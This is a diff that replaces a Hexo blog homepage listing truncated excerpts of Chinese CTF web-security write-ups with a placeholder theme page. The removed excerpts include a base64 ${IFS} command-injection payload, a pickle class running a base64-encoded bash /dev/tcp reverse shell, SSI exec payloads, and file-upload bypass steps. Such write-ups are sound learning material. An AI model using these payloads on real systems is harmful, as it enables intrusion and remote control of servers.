@@ -1,302 +1,193 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>p0l1st's blog</title><meta name="author" content="p0l1"><meta name="copyright" content="p0l1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="p0l1st&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="blog">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
-<meta property="article:author" content="p0l1">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: 'Copy Successful',
-    error: 'Copy Error',
-    noSupport: 'Browser Not Supported'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just now',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: 'Load More'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'p0l1st\'s blog',
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2024-02-06 12:04:55'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="p0l1st">
+
+
+
+    <meta name="description" content="blog">
+
+
+
+<title>p0l1st&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
+    <link rel="stylesheet" href="/css/style.css">
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+
+
+
+    <!-- scripts list from _config.yml -->
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+    <script src="/js/script.js"></script>
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+    <script src="/js/tocbot.min.js"></script>
     
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
         }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="p0l1st's blog"><span class="site-name">p0l1st's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">p0l1st's blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/06/BeginCTF2024web%E9%83%A8%E5%88%86wp/" title="BeginCTF2024web部分wp">BeginCTF2024web部分wp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-02-06T03:38:10.000Z" title="Created 2024-02-06 11:38:10">2024-02-06</time></span></div><div class="content">readbookspayload
-1public/*|e%22%22cho$%7BIFS%7D%22Y2F0IC9fZmxhZw%22$%7BIFS%7D|$%7BIFS%7Dba%22%22se64$%7BIFS%7D-d$%7BIFS%7D|$%7BIFS%7Db%22%22ash
+    }
+</script>
+            <div class="main">
+                
+    <div class="container profile-container">
+    <div class="intro">
+        <div class="avatar">
+            <a href="/archives"><img src="/image/avatar.jpeg"></a>
+        </div>
+        <div class="nickname">Jeremy Bentham</div>
+        <div class="description"><p>Lorem ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> <br>Fusce eget urna vitae velit <em>eleifend interdum at ac</em> nisi.</p>
+</div>
+        <div class="links">
+            
+                
+                    <a class="link-item" title="Blog" href="/archives">
+                        
+                        
+                            <i class="iconfont icon-blog"></i>
+                        
+                    </a>
+                
+                    <a class="link-item" title="ZhiHu" target="_blank" rel="noopener" href="https://www.zhihu.com/people/sirice">
+                        
+                        
+                            <i class="iconfont icon-zhihu"></i>
+                        
+                    </a>
+                
+                    <a class="link-item" title="Instagram" href="">
+                        
+                        
+                            <i class="iconfont icon-instagram"></i>
+                        
+                    </a>
+                
+                    <a class="link-item" title="Reddit" href="">
+                        
+                        
+                            <i class="iconfont icon-reddit"></i>
+                        
+                    </a>
+                
+                    <a class="link-item" title="Github" target="_blank" rel="noopener" href="https://github.com/Siricee">
+                        
+                        
+                            <i class="iconfont icon-github"></i>
+                        
+                    </a>
+                
+            
+        </div>
+    </div>
+</div>
 
 
-pickelshop123456789101112131415import base64import pickleclass shell(object):    def __reduce__(self):        # bash -i &gt;&amp; /dev/tcp/你的ip/9999 0&gt;&amp;1的base64        # 不能直接bash -i 0&gt;&amp;1那种写法，因为像是&amp;这些符号 都是linux的shell关键字 会影响他的语法        return (eval, (        &quot;__import__(&#x27;os&#x27;).system(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xM ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/23/create-function-%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="create_function()函数代码执行">create_function()函数代码执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-01-23T11:42:33.000Z" title="Created 2024-01-23 19:42:33">2024-01-23</time></span></div><div class="content">create_function()函数适用范围： php4 &gt;&#x3D;4.0.1  php5   php7
-功能：根据传递的参数创建匿名函数，并为其返回唯一名称。
-123create_function(string $args,string $code)$args 声明的函数变量$code 执行的方法代码
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
 
-exam:
-1234&lt;?php$test = create_function(&#x27;$a, $b&#x27;, &#x27;return &quot;$a + $b = &quot; . ($a + $b);&#x27;);echo &quot;function: &quot; . $test . &quot;\n&quot;;echo $test(3,4);
+    </div>
+</body>
 
-
-可以看到创建了匿名函数lambda并且执行了代码。
-构造代码执行exam:
-12345678910&lt;?php$id=$_GET[&#x27;id&#x27;];$str2=&#x27;echo  &#x27;.$a.&#x27;test&#x27;.$id.&quot;;&quot;;echo ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/22/htaccess%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/" title=".htaccess奇淫技巧">.htaccess奇淫技巧</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-01-22T07:10:15.000Z" title="Created 2024-01-22 15:10:15">2024-01-22</time></span></div><div class="content">基本概念.htaccess文件是Apache中的一种特殊文件，其提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的文件，以作用于此目录及其所有子目录。
-.htaccess中有 # 单行注释符，并且支持 \ 拼接上下两行。
-作用范围.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其子目录。
-而子目录中的指令会覆盖父目录或者主配置文件中的指令。
-常见指令.htaccess可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
-SetHandler强制所有匹配的文件被一个指定的处理器处理
-1SetHandler handler-name|None
-
-exam:
-1SetHandler application/x-httpd-php
-
-此时当前目录及子目录下所有文件都会被当作php解析
-1SetHandler server-status
-
-开启Apache服务器状态信息，可以查看所有访问本站的记录
-AddHandler实现在文件扩展名与特定的处理器 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="preg_replace /e模式下的代码执行">preg_replace /e模式下的代码执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-01-19T14:56:33.000Z" title="Created 2024-01-19 22:56:33">2024-01-19</time></span></div><div class="content">案例：
-1preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$str）
-
-&#x2F;e模式1preg_replace($pattern,$replacement.$string)
-
-&#x2F;e 修正符使preg_replace()将replacement参数当作PHP代码执行(确保replacement构成合法PHP代码字符串)。
-这里介绍一下preg_replace()的一些模式：
-
-&#x2F;g 表示该表达式用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。
-&#x2F;i 表示匹配的时候不区分大小写
-&#x2F;m 表示多行匹配（匹配换行符两端的潜在匹配）
-&#x2F;s 单行模式匹配
-&#x2F;e 可执行模式
-&#x2F;x 忽略空白模式
-
-反向引用1234对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/" title="2024寒假刷题">2024寒假刷题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-01-14T15:10:55.000Z" title="Created 2024-01-14 23:10:55">2024-01-14</time></span></div><div class="content">[GWCTF 2019]枯燥的抽奖访问环境
-
-这里说是要猜号，查看源码，发现check.php
-
-访问
-12345678910111213141516171819202122232425262728 &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.= ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/14/upload-labs%E9%80%9A%E5%85%B3/" title="upload-labs通关">upload-labs通关</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2024-01-14T12:31:21.000Z" title="Created 2024-01-14 20:31:21">2024-01-14</time></span></div><div class="content">pass-01第一关前端js校验
-修改前端js代码F12查看
-
-删除onsubmit&#x3D;”return checkFile()即可
-
-禁用js
-burp抓包绕过将文件后缀设置为jpg，然后抓包
-
-再将后缀修改为php
-
-上传成功
-
-pass-02第二关检查文件的MIME
-上传1.php，抓包
-
-修改application&#x2F;octet-stream为image&#x2F;jpeg
-
-上传成功
-
-pass-03第三关禁止上传.asp|.aspx|.php|.jsp后缀文件
-把后缀改为phtml
-
-后缀也可以为.phps .php5 .pht
-但是要配置apache的httpd.conf
-pass-04第四关本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|. ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="SSI远程命令执行">SSI远程命令执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-31T13:25:44.000Z" title="Created 2023-12-31 21:25:44">2023-12-31</time></span></div><div class="content">前言之前没有听过这个漏洞，在做BUUCTF一道题中发现了，学习一下。
-Apache SSI远程命令执行漏洞在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。但是如果目标服务器开启了SSI和CGI支持，我们可以上传一个shtml文件，并构造命令执行来进行利用。
-漏洞复现上传shell.shtml
-1&lt;!--#exec cmd==&quot;ls&quot;--&gt;
-
-
-访问，成功执行
-
-参考链接：
-Apache-SSI-远程命令执行漏洞
-[BJDCTF2020]EasySearch前面不再赘述，这里从登录成功开始。
-如图，正确的账号密码登录
-
-可以发现生成了一个shtml文件
-访问
-
-观察一下，admin是username的值，被输出，结合会生成shtml文件，猜想会不会存在SSI远程命令执行漏洞
-构造
-1username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=20206666
-
-
-访问，可以看到flag文件
-
-读取
-1username=&lt;!--#exec cmd=&quot;c ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/27/Fast-destruct/" title="Fast destruct">Fast destruct</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-27T04:43:37.000Z" title="Created 2023-12-27 12:43:37">2023-12-27</time></span></div><div class="content">什么是Fast destruct在php中，有
-
-如果单独执行unserialize函数进行反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类也就没有了，在有析构函数的情况下就会执行它
-如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量中，当这个对象被销毁时才会执行其析构函数。
-
-通俗来讲，就是php中的所有类只有在php代码渲染页面渲染结束后才会被销毁，只有销毁的时候才能触发**__destruxct()函数，一旦出现报错或者代码终止就不会触发destruct**函数。
-原理unserialize函数反序列化过程：
-获取反序列化字符串-&gt;根据类型进行反序列化-&gt;找到对应反序列化类-&gt;根据字符判断元素个数-&gt;创建对象-&gt;迭代解析剩下的字符串-&gt;判断是否有__wakeup()并标记-&gt;释放空间并判断是否具有标记-&gt;调用
-整个过程逐步对对象进行解析，而且会根据相应的魔法函数标记去调用。即使完整的反序列化失败，涉及到的对象 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/25/%E5%88%9D%E6%8E%A2RSA%E7%AE%97%E6%B3%95/" title="初探RSA算法">初探RSA算法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-24T16:11:51.000Z" title="Created 2023-12-25 00:11:51">2023-12-25</time></span></div><div class="content">RSA加密RSA算法是现今使用最广泛的公钥密码算法。
-根据密钥使用方法，可以将密码分为对称加密和非对称加密
-
-对称加密：加密和解密使用同一种密钥
-公钥加密：加密和解密使用不同密钥
-
-RSA加密过程可以使用一个通式来表示
-
-也就是说RSA加密是对明文的E次方除以N后求余数的过程
-只要知道E和N，任何人都可以进行RSA加密，所以E和N的组合就是公钥，用(E,N)来表示
-E是加密(Encryption)，N是数字(Number)
-RSA解密同样的，RSA解密也可以使用一个通式来表示
-
-RSA解密就是对密文的D次方除以N后求余数的过程
-知道D和N就可以进行解密，所以D和N的组合就是私钥，用(D,N)表示
-D是解密(Decryption),N是数字
-生成密钥对公钥是(E,N)，私钥是(D,N)，所以密钥对是(E,D,N)
-密钥生成步骤如下:
-
-求N
-求L(计算过程的中间数)
-求E
-求D
-
-求N两个质数p，q(不能太小，容易破解)
-1N = p * q
-
-求欧拉函数φ(N)1φ(N) = (p-1) * (q-1)
-
-求EE需要满足两个条件
-
-1 &lt; E &lt; φ(N)
-gcd(E,φ( ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="从一道题学习LFI包含pearcmd命令执行">从一道题学习LFI包含pearcmd命令执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-23T08:17:06.000Z" title="Created 2023-12-23 16:17:06">2023-12-23</time></span></div><div class="content">pearpear全称PHP Extension and Application Reposition(php扩展和应用仓库)，在docker中默认安装，路径为&#x2F;usr&#x2F;loacl&#x2F;lib&#x2F;php
-register_argc_argv为On时，$_SERVER[‘argv’]和$_SERVER[‘argc’]会记录一些东西。在web中，传参时使用+连接的值的个数就是argc，各个参数被存到argv里。
-exam:
-12345&lt;?php$a=$_GET[&#x27;a&#x27;];var_dump($_SERVER[&#x27;argc&#x27;]);var_dump($_SERVER[&#x27;argv&#x27;]);?&gt;
-
-0.php?a&#x3D;a
-
-0.php?a&#x3D;a+b+c
-
-这里是根据+做分隔符来判断。
-利用条件目标装了pear组件，register_argc_argv为On，可以包含到pearcmd.php文件(不受open_basedir和文件后缀限制)
-利用原理当文件包含了pearcmd.php时就会 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">p0l1</div><div class="author-info__description">blog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/06/BeginCTF2024web%E9%83%A8%E5%88%86wp/" title="BeginCTF2024web部分wp">BeginCTF2024web部分wp</a><time datetime="2024-02-06T03:38:10.000Z" title="Created 2024-02-06 11:38:10">2024-02-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/23/create-function-%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="create_function()函数代码执行">create_function()函数代码执行</a><time datetime="2024-01-23T11:42:33.000Z" title="Created 2024-01-23 19:42:33">2024-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/htaccess%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/" title=".htaccess奇淫技巧">.htaccess奇淫技巧</a><time datetime="2024-01-22T07:10:15.000Z" title="Created 2024-01-22 15:10:15">2024-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="preg_replace /e模式下的代码执行">preg_replace /e模式下的代码执行</a><time datetime="2024-01-19T14:56:33.000Z" title="Created 2024-01-19 22:56:33">2024-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/" title="2024寒假刷题">2024寒假刷题</a><time datetime="2024-01-14T15:10:55.000Z" title="Created 2024-01-14 23:10:55">2024-01-14</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/ctf-web%E5%AE%89%E5%85%A8/" style="font-size: 1.1em; color: #999">ctf web安全</a> <a href="/tags/CTF-php/" style="font-size: 1.1em; color: #999">CTF php</a> <a href="/tags/php/" style="font-size: 1.3em; color: #99a1ac">php</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-web%E5%AE%89%E5%85%A8/" style="font-size: 1.1em; color: #999">文件上传 web安全</a> <a href="/tags/http/" style="font-size: 1.1em; color: #999">http</a> <a href="/tags/php-CTF/" style="font-size: 1.1em; color: #999">php CTF</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/ctf-RCE/" style="font-size: 1.1em; color: #999">ctf RCE</a> <a href="/tags/Crypto/" style="font-size: 1.1em; color: #999">Crypto</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">February 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">January 2024</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">December 2023</span><span class="card-archive-list-count">10</span></a></li></ul></div><div class="card-widget 